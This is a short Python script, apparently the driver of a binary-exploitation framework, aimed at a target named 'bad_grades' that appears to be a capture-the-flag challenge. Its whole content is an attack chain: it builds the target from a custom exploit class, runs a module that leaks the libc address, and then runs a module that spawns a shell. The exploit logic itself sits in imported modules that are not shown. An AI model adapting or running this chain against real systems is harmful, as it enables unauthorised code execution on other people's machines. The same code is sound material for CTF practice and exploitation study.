from core.targetbase import TargetBase
from custom.bad_grades import BadGradesPwn
from modules.get_libc_address import GetLibcAddress
from modules.exec_shell import ExecShell

if __name__ == '__main__':
    t = TargetBase(pwn_target=BadGradesPwn)
    if GetLibcAddress.execute(t):
        ExecShell.execute(t)
